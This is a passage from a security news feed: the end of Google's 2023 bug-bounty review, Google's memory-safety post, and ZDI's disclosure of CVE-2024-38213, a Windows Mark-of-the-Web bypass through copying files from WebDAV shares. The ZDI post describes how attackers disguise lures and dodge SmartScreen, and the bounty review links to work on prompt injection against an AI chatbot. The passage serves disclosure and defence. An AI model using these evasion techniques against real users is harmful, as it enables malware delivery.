The <a href="https://bughunters.google.com/about/rules/5604090422493184/google-play-security-reward-program-rules">Google Play Security Reward Program</a> continued to foster security research across popular Android apps on Google Play.
</p>
<p>
A huge thank you to the researchers who made our program such a success. A special shout out to Zinuo Han (<a href="https://twitter.com/ele7enxxh">@ele7enxxh</a>) of OPPO Amber Security Lab and Yu-Cheng Lin (林禹成) (<a href="https://twitter.com/AndroBugs">@AndroBugs</a>) for your hard work and continuing to be some of the top researchers contributing to Android VRPs!
</p>
<p>
<strong>Chrome<br /></strong>
</p>
<p>
2023 was a year of changes and experimentation for the <a href="https://g.co/chrome/vrp">Chrome VRP</a>. In Chrome Milestone 116, <a href="https://security.googleblog.com/2022/09/use-after-freedom-miracleptr.html">MiraclePtr</a> was launched across all Chrome platforms. This resulted in raising the difficulty of discovery of fully exploitable non-renderer UAFs in Chrome and resulted in lower reward amounts for MiraclePtr-protected UAFs, as <a href="https://g.co/chrome/vrp/##reward-amounts-for-mitigated-security-bugs">highly mitigated security bugs</a>. While code and issues protected by MiraclePtr are expected to be resilient to the exploitation of non-renderer UAFs, the Chrome VRP launched the <a href="https://g.co/chrome/vrp/#miracleptr-bypass-reward">MiraclePtr Bypass Reward </a>to incentivize research toward discovering potential bypasses of this protection.
</p>
<p>
The Chrome VRP also launched the <a href="https://g.co/chrome/vrp/#full-chain-exploit-bonus">Full Chain Exploit Bonus</a>, offering triple the standard full reward amount for the first Chrome full-chain exploit reported and double the standard full reward amount for any follow-up reports. While both of these large incentives have gone unclaimed, we are leaving the door open in 2024 for any researchers looking to take on these challenges.
</p>
<p>
In 2023, Chrome VRP also introduced increased rewards for V8 bugs in older channels of Chrome, with an additional bonus for bugs existing before M105. This resulted in a few very impactful reports of long-existing V8 bugs, including one report of a V8 JIT optimization bug in Chrome since at least M91, which resulted in a $30,000 reward for that researcher.
</p>
<p>
All of this resulted in $2.1M in rewards to security researchers for 359 unique reports of Chrome Browser security bugs. We were also able to meet some of our top researchers from previous years who were invited to participate in bugSWAT as part of Google’s ESCAL8 event in Tokyo in October. We capped off the year by publicly <a href="https://issues.chromium.org/issues/41482500">announcing </a>our 2023 Top 20 Chrome VRP reporters who received a bonus reward for their contributions. 
</p>
<p>
Thank you to the Chrome VRP security researcher community for your contributions and efforts to help us make Chrome more secure for everyone!
</p>
<p>
<strong>Generative AI<br /></strong>
</p>
<p>
Last year, we also ran a bugSWAT live-hacking event targeting LLM products. Apart from fun, sun, and a lot to do, we also got 35 reports, totaling more than $87,000 - and discovered issues like Johann, Joseph, and Kai’s “<a href="https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/">Hacking Google Bard - From Prompt Injection to Data Exfiltration</a>” and Roni, Justin, and Joseph’s “<a href="https://www.landh.tech/blog/20240304-google-hack-50000/">We Hacked Google A.I. for $50,000</a>”.
</p>
<p>
To help AI-focused bughunters know what’s in scope and what’s not, we recently published our <a href="https://security.googleblog.com/2023/10/googles-reward-criteria-for-reporting.html">criteria for bugs in AI products</a>. This criteria aims to facilitate testing for traditional security vulnerabilities as well as risks specific to AI systems, and is one way that we are implementing the<a href="https://www.whitehouse.gov/wp-content/uploads/2023/07/Ensuring-Safe-Secure-and-Trustworthy-AI.pdf"> voluntary AI commitments</a> that Google made at the White House in July.<br />
</p>
<p>
<strong>Looking Forward<br /></strong>
</p>
<p>
We remain committed to fostering collaboration, innovation, and transparency with the security community. Our ongoing mission is to stay ahead of emerging threats, adapt to evolving technologies, and continue to strengthen the security posture of Google’s products and services. We look forward to continuing to drive greater advancements in the world of cybersecurity.<br />
</p>
<p>
A huge thank you to our bug hunter community for helping to make Google products and platforms more safe and secure for our users around the world! 
</p>
<p>
<em>Thank you to Adam Bacchus, Dirk Göhmann, Eduardo Vela, Sarah Jacobus, Amy Ressler, Martin Straka, Jan Keller, Tony Mendez. </em>
</p>
]]></content:encoded>
<pubDate>2024-03-12T11:59:14.127-04:00</pubDate>
</item>
<item>
<title>Secure by Design: Google’s Perspective on Memory Safety</title>
<link>http://security.googleblog.com/2024/03/secure-by-design-googles-perspective-on.html</link>
<guid>http://security.googleblog.com/2024/03/secure-by-design-googles-perspective-on.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Alex Rebert, Software Engineer, Christoph Kern, Principal Engineer, Security Foundations</span><div><br /></div><div><span class="byline-author"><br /></span></div><div><span class="byline-author"><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">Google’s Project Zero </span><a href="https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">reports</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"> that </span><a href="https://www.memorysafety.org/docs/memory-safety/"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">memory safety vulnerabilities</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">—security defects caused by subtle coding errors related to how a program accesses memory—have been "the standard for attacking software for the last few decades and it’s still how attackers are having success". Their analysis shows two thirds of 0-day exploits detected in the wild used memory corruption vulnerabilities. Despite substantial investments to improve memory-unsafe languages, those vulnerabilities continue to top the </span><a href="https://cwe.mitre.org/top25/archive/2023/2023_kev_list.html"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">most commonly exploited vulnerability classes</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">In this post, we share our perspective on memory safety in a </span><a href="https://research.google/pubs/pub53121/"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">comprehensive whitepaper</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">. This paper delves into the data, challenges of tackling memory unsafety, and discusses possible approaches for achieving memory safety and their tradeoffs. We'll also highlight our commitments towards implementing several of the solutions outlined in the whitepaper, most recently with a </span><a href="https://security.googleblog.com/2024/02/improving-interoperability-between-rust-and-c.html"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">$1,000,000 grant to the Rust Foundation</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">, thereby advancing the development of a robust memory-safe ecosystem.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"></p>
  
  <h1 dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 24pt;"><span style="color: #4285f4; font-family: Roboto, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Why we’re publishing this now</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">2022 marked the 50th anniversary of memory safety vulnerabilities. Since then, memory safety risks have grown more obvious. Like others', Google's internal vulnerability data and research show that memory safety bugs are widespread and one of the leading causes of vulnerabilities in memory-unsafe codebases. Those vulnerabilities endanger end users, our industry, and the broader society. We're encouraged to see governments also taking this issue seriously, as with the U.S. Office of the National Cyber Director publication of a </span><a href="https://www.whitehouse.gov/wp-content/uploads/2024/02/Final-ONCD-Technical-Report.pdf"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">paper</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"> on the topic last week.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">By sharing our insights and experiences, we hope to inspire the broader community and industry to adopt memory-safe practices and technologies, ultimately making technology safer.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"></p>
  
  <h1 dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="color: #4285f4; font-family: Roboto, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Our perspective</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">At Google, we have decades of experience addressing, at scale, large classes of vulnerabilities that were once similarly prevalent as memory safety issues. Our approach, which we call “</span><a href="https://research.google/pubs/pub53116/"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">Safe Coding</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">”, treats vulnerability-prone coding constructs&nbsp; themselves as hazards (i.e., independently of, and in addition to, the vulnerability they might cause), and is centered around ensuring developers do not encounter such hazards during regular coding practice.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"><span style="color: #434343;">Based on this experience, we expect that high assurance memory safety can only be achieved via a </span></span><span style="background-color: white; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"><a href="https://blog.google/technology/safety-security/tackling-cybersecurity-vulnerabilities-through-secure-by-design/"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">Secure-by-Design approach</span></a></span><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"> centered around comprehensive adoption of languages with rigorous memory safety guarantees. As a consequence, we are considering a gradual transition towards memory-safe languages like Java, Go, and Rust.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">Over the past decades, in addition to large Java and Go memory-safe codebases, Google has developed and accumulated hundreds of millions of lines of C++ code that is in active use and under active, ongoing development. This very large existing codebase results in significant challenges for a transition to memory safety:</span></p>
  <ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; vertical-align: baseline;">We see no realistic path for an evolution of C++ into a language with rigorous memory safety guarantees that include temporal safety.</span></p></li>
  <li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; vertical-align: baseline;">A large-scale rewrite of all existing C++ code into a different, memory-safe language appears very difficult and will likely remain impractical.</span></p></li></ul>
  <div><span style="color: #434343; font-family: Roboto, sans-serif;"></span></div><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 1pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">We consider it important to complement a transition to memory safe languages for new code and particularly at-risk components with safety improvements for existing C++ code, to the extent practicable. We believe that substantial improvements can be achieved through an incremental transition to a partially-memory-safe C++ language subset, augmented with hardware security features when available. For instance, see </span><a href="https://bughunters.google.com/blog/6368559657254912/llvm-s-rfc-c-buffer-hardening-at-google"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">our work improving spatial safety in GCP's networking stack</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">.</span></p>
  
  <h1 dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 24pt;"><span style="color: #4285f4; font-family: Roboto, sans-serif; font-size: 16pt; font-weight: 400; vertical-align: baseline;">Our investments in memory-safe languages</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">We are actively investing in many of the solutions outlined in our whitepaper and in our </span><a href="https://www.regulations.gov/comment/ONCD-2023-0002-0074"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">response</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"> to the </span><a href="https://www.regulations.gov/document/ONCD-2023-0002-0001"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">US Federal Government’s RFI on Open Source Software Security</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">.</span></p>
  
  <ul style="margin-bottom: 1pt; margin-top: 1pt; padding-inline-start: 48px;">
  
  <li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; font-weight: 700; vertical-align: baseline;">Android</span><span style="font-size: 12pt; vertical-align: baseline;"> has written several components in Rust over the last few years, leading to </span><a href="https://security.googleblog.com/2022/12/memory-safe-languages-in-android-13.html"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">compelling security improvements</span></a><span style="font-size: 12pt; vertical-align: baseline;">. In Android’s Ultra-wideband (UWB) module, this has improved the security of the module while also reducing the memory usage and inter-procedural calls.&nbsp;</span></p></li></ul><ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;">
  <li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; font-weight: 700; vertical-align: baseline;">Chrome</span><span style="font-size: 12pt; vertical-align: baseline;"> has </span><a href="https://groups.google.com/a/chromium.org/g/chromium-dev/c/UhwVDk4HZFA/m/UAA2D96QBAAJ"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">started shipping some features in Rust</span></a><span style="font-size: 12pt; vertical-align: baseline;">; in one case, Chrome was able to move its QR code generator out of a sandbox by adopting a new memory-safe library written in Rust, leading to </span><span style="font-size: 12pt; font-style: italic; vertical-align: baseline;">both</span><span style="font-size: 12pt; vertical-align: baseline;"> better security and better performance.</span></p></li></ul>
  <ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; vertical-align: baseline;">Google recently announced a </span><a href="https://security.googleblog.com/2024/02/improving-interoperability-between-rust-and-c.html"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">$1,000,000 grant to the Rust foundation</span></a><span style="font-size: 12pt; vertical-align: baseline;"> to enhance interoperability with C++ code. This will facilitate incremental adoption of Rust in existing memory-unsafe code bases, which will be key to enabling even more new development to occur in a memory-safe language. Relatedly, we are also working on addressing </span><a href="https://bughunters.google.com/blog/4805571163848704/llvm-cfi-and-cross-language-llvm-cfi-support-for-rust"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">cross-language attacks</span></a><span style="font-size: 12pt; vertical-align: baseline;"> that can occur when mixing Rust and C++ in the same binary.</span></p></li></ul>
  <ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li dir="ltr" style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 12pt; vertical-align: baseline;">Google is investing in building the memory-safe open-source ecosystem through </span><a href="https://www.memorysafety.org/"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">ISRG Prossimo</span></a><span style="font-size: 12pt; vertical-align: baseline;"> and </span><a href="https://alpha-omega.dev/"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">OpenSSF’s Alpha-Omega project</span></a><span style="font-size: 12pt; vertical-align: baseline;">. Back in 2021, we funded </span><a href="https://www.memorysafety.org/blog/supporting-miguel-ojeda-rust-in-linux/"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">efforts to bring Rust to the Linux Kernel</span></a><span style="font-size: 12pt; vertical-align: baseline;">, which is now enabling us to write </span><a href="https://lore.kernel.org/lkml/20231101-rust-binder-v1-0-08ba9197f637@google.com/"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">memory-safe drivers</span></a><span style="font-size: 12pt; vertical-align: baseline;">. This funding is also going towards providing alternatives or upgrades to key open-source libraries in a memory-safe language, such as providing a </span><a href="https://www.memorysafety.org/blog/rustls-and-rust-for-linux-funding-openssf/"><span style="color: #1155cc; font-size: 12pt; vertical-align: baseline;">memory safe TLS implementation</span></a><span style="font-size: 12pt; vertical-align: baseline;">.</span></p></li></ul><p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"></p>
  <p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">We know that memory safe languages will not address every security bug, but just as our efforts to </span><a href="https://bughunters.google.com/blog/5896512897417216/a-recipe-for-scaling-security"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">eliminate XSS attacks through tooling showed</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">, removing large classes of exploits both directly benefits consumers of software and allows us to move our focus to addressing further classes of security vulnerabilities.</span></p>
  
  <p dir="ltr" style="line-height: 1.38; margin-bottom: 10pt; margin-top: 0pt;"><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">To access the full whitepaper and learn more about Google's perspective on memory safety, visit </span><a href="https://research.google/pubs/secure-by-design-googles-perspective-on-memory-safety/"><span style="color: #1155cc; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;">https://research.google/pubs/secure-by-design-googles-perspective-on-memory-safety/</span></a><span style="color: #434343; font-family: Roboto, sans-serif; font-size: 12pt; vertical-align: baseline;"> </span></p></span></div>
]]></content:encoded>
<pubDate>2024-03-08T05:12:51.193-05:00</pubDate>
</item>
<item>
<title>CVE-2024-38213: Copy2Pwn Exploit Evades Windows Web Protections</title>
<link>https://www.thezdi.com/blog/2024/8/14/cve-2024-38213-copy2pwn-exploit-evades-windows-web-protections</link>
<guid>https://www.thezdi.com/blog/2024/8/14/cve-2024-38213-copy2pwn-exploit-evades-windows-web-protections</guid>
<content:encoded><![CDATA[
<p class=""><em>Zero Day Initiative threat researchers discovered CVE-2024-38213, a simple and effective way to bypass Windows mark-of-the-web protections leading to remote code execution.</em></p><p class="">In March 2024, Trend Micro’s Zero Day Initiative Threat Hunting team started analyzing samples connected to the activity carried out by DarkGate operators to infect users through copy-and-paste operations. This DarkGate campaign was an update from a <a href="https://www.trendmicro.com/en_us/research/24/c/cve-2024-21412--darkgate-operators-exploit-microsoft-windows-sma.html">previous campaign</a>&nbsp; in which the DarkGate operators were exploiting a zero-day vulnerability, <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21412">CVE-2024-21412</a>, which we disclosed to Microsoft earlier this year. </p><p class="">The investigation into this campaign directly influenced further vulnerability research into Windows Defender SmartScreen and how files originating from WebDAV shares are handled during copy-and-paste operations. As a result, we discovered and reported CVE-2024-38213 to Microsoft, which they patched in June. This exploit, which we've named copy2pwn, results in a file from a WebDAV share being copied locally without Mark-of-the-Web protections.</p><h2>What is Web-based Distributed Authoring and Versioning (WebDAV)?</h2><p class="">Web-based Distributed Authoring and Versioning (WebDAV) is an extension to the Hypertext Transfer Protocol (HTTP). It provides added functionality to HTTP, including features such as authoring, sharing, and versioning.</p>





















  
  



<p>Since WebDAV is based on HTTP, WebDAV shares can be accessed through a web browser using the HTTP protocol, for example, at <code>http://10.37.129.2/example_webdav_folder/somefile</code>. When a file is downloaded from a WebDAV share using a browser such as Microsoft Edge or Google Chrome, it is treated the same as any other file downloaded from the web. As expected, the local copy of the file is marked with the Mark-of-the-Web.  </p>
<p>On Windows, users can also access and mount WebDAV shares via UNC paths, such as <code>\\10.37.129.2@80\example_webdav_folder</code>. A user can browse to a path of this form using Windows Explorer. This functions in a similar manner to accessing SMB shares through Windows. When accessing files in this manner, they are handled directly by the Windows operating system and not by the browser.</p>




  <h2>Threat Actors and WebDAV Shares</h2><p class="">Recently, we’ve seen an increase in threat actors hosting payloads on WebDAV shares. This activity has led to the discovery of numerous vulnerabilities abused as zero-days clustered around accessing malicious payloads from WebDAV shares. These include vulnerabilities such as <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36025">CVE-2023-36025</a> and, more recently, <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21412">CVE-2024-21412</a>, with an additional fix from Microsoft in the form of <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29988">CVE-2024-29988</a>. These vulnerabilities center around Mark-of-the-Web bypasses and evading built-in Microsoft protections such as Windows Defender SmartScreen. </p><p class="">As mentioned, WebDAV shares accessed through Windows Explorer are handled by the Windows operating system as opposed to a browser. &nbsp;Many threat actors are aware of the implications of this with regard to Mark-of-the-Web. During our threat-hunting investigations, we uncovered many threat actors deploying an easy method utilizing the Windows search protocol to open WebDAV searches through Windows Explorer.</p>





















  
  














































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
              
              
          
            
                
                
                
                
                
                
                
                <img alt="" height="320" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/a0bf33b9-5251-48ca-844b-3b237b5676c4/Picture1.png?format=1000w" width="1430" />

            
          
        
            
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 1 – Search query logic that opens a WebDAV share through Windows Explorer</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">When accessed with a web browser, this prompts the user to open the WebDAV share in Windows Explorer.</p>





















  
  














































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
              
              
          
            
                
                
                
                
                
                
                
                <img alt="" height="400" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/46bf00a8-6e4b-4312-ae7e-30b0c6edb7dd/Picture2.png?format=1000w" width="1430" />

            
          
        
            
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 2 – Microsoft Edge prompts users to open the WebDAV share in Windows Explorer</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">Using the logic from Figure 1, threat actors can exercise a high degree of control over what the end user sees on the WebDAV share. This is done by crafting a specific Windows search query that only displays those files the threat actor wants the user to see. Furthermore, by utilizing certain file types such as Internet Shortcut (.url) or Shortcut (.lnk), the threat actor may change the file icon to make it appear as if the malicious file is a completely different type. This lures the user into inadvertently executing scripts or binaries.</p>





















  
  














































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
              
              
          
            
                
                
                
                
                
                
                
                <img alt="" height="326" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/50321cca-e6cc-448f-af6a-84cfa5708a87/Picture3.png?format=1000w" width="1430" />

            
          
        
            
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 3 – The Windows Explorer window is crafted to only display poc.lnk.zip</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">Under normal circumstances, files served over WebDAV would receive the Mark-of-the-Web and Windows Defender SmartScreen protections. However, there are a cluster of vulnerabilities mentioned above, and possibly more, that can be used for evasion.</p><h2>The Importance of Mark-of-the-Web (MotW) Protections</h2>





















  
  



<p>When a user downloads a file from an untrusted source such as the web, Windows adds the Mark-of-the-Web to the local copy of the file. The Mark-of-the-Web consists of an NTFS Alternate Data Stream (ADS) with the name Zone.Identifier. Within this stream is the text <code>ZoneId=3</code>, indicating that the file originated from an untrusted source.</p>












































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
              
              
          
            
                
                
                
                
                
                
                
                <img alt="" height="259" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/51e7f8e8-9e59-493b-8436-fe2d675b3d7e/Picture4.png?format=1000w" width="1430" />

            
          
        
            
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 4 – ZoneId=3 is applied to files that originate from an untrusted source</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">The presence of the Mark-of-the-Web triggers additional security checks and prompts when opening the file. This helps reduce the risk of executing untrusted content. </p>





















  
  














































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
              
              
          
            
                
                
                
                
                
                
                
                <img alt="" height="390" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/268e104b-dfc7-4f77-aeae-81e8eae67d75/Picture5.png?format=1000w" width="596" />

            
          
        
            
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 5 – A security prompt shown due to the presence of the Mark-of-the-Web</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">The Mark-of-the-Web is also needed for the functioning of other key protection mechanisms:</p><p class="">·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Windows Defender SmartScreen, which examines files based on reputation and signature<br />·&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft Office Protected View, which protects users from threats such as malicious macros and Dynamic Data Exchange (DDE) attacks.</p>





















  
  














































  

    
  
    

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            ">
          
        
        

        
          
            
          
            
                
                
                
                
                
                
                
                <img alt="" height="722" src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/8ec7cd59-a472-4c43-8110-5d3ed7e8b9ab/Picture6.png?format=1000w" width="772" />

            
          
        
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <p class=""><em>Figure 6 – A Windows Defender SmartScreen prompt</em></p>
          </figcaption>
        
      
        </figure>
      

    
  


  





  <p class="">Unfortunately, threat actors have discovered that Windows does not always handle or properly apply the Mark-of-the-Web to files served over WebDAV. Historically, Windows has treated WebDAV shares more akin to SMB shares, as opposed to HTTP web servers. This can be quite dangerous.</p><h2>Bypassing Mark-of-the-Web Protections with CVE-2024-38213</h2><p class="">Before the release of the Microsoft June security patch, files copied and pasted from WebDAV shares did not receive the Mark-of-the-Web designations. This meant that users might copy and paste files from a WebDAV share to their desktop, and those files could subsequently be opened without the protections of Windows Defender SmartScreen or Microsoft Office Protected View. In particular, this means that there would be no reputation or signature checks on executables.</p>





















  
  






  <p class="">Copy and paste operations are ubiquitous so Windows users need to ensure that they are fully protected from <a href="https://www.geeksforgeeks.org/clipboard-hijacking-attack/" target="_blank" title="https://www.geeksforgeeks.org/clipboard-hijacking-attack/">clipboard hijacking</a>, <a href="https://www.geeksforgeeks.org/what-is-pastejacking/" target="_blank" title="https://www.geeksforgeeks.org/what-is-pastejacking/">pastejacking</a>&nbsp;, and copy2pwn attacks, especially in light of recent threat actor activity leveraging WebDAV shares for payload deployment.</p><h2>Conclusion</h2><p class="">The Zero Day Initiative Threat Hunting Team constantly monitors for new and emerging zero-day threats. During our analysis of existing and previous threat actors and APT activities, we often discover new tactics, techniques, procedures, and hidden zero-day vulnerabilities. </p><p class="">This case emphasizes the integration of ZDI threat hunting with proactive vulnerability research within the ZDI program. By combining threat research with the Zero Day Initiative's core vulnerability research program, the ZDI Threat Hunting Team can develop new adversarial models and simulate new attack strategies as they might occur in the real world. This integration enables us to protect and defend customers from potentially hidden attack methods and chains before threat actors can incorporate them into their attack strategies.</p><p class="">We’ll be back with more findings as we have them. Until then, follow the team on <a href="https://www.twitter.com/thezdi">Twitter</a>, <a href="https://infosec.exchange/@thezdi">Mastodon</a>, <a href="https://www.linkedin.com/company/zerodayinitiative">LinkedIn</a>, or <a href="https://www.instagram.com/thezdi">Instagram</a> for the latest in exploit techniques and security patches.</p>
]]></content:encoded>
<pubDate>Thu, 15 Aug 2024 15:41:52 +0000</pubDate>
</item>
<item>
<title>CVE-2024-2887: A Pwn2Own Winning Bug in Google Chrome</title>
<link>https://www.thezdi.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome</link>
<guid>https://www.thezdi.com/blog/2024/5/2/cve-2024-2887-a-pwn2own-winning-bug-in-google-chrome</guid>
<content:encoded><![CDATA[
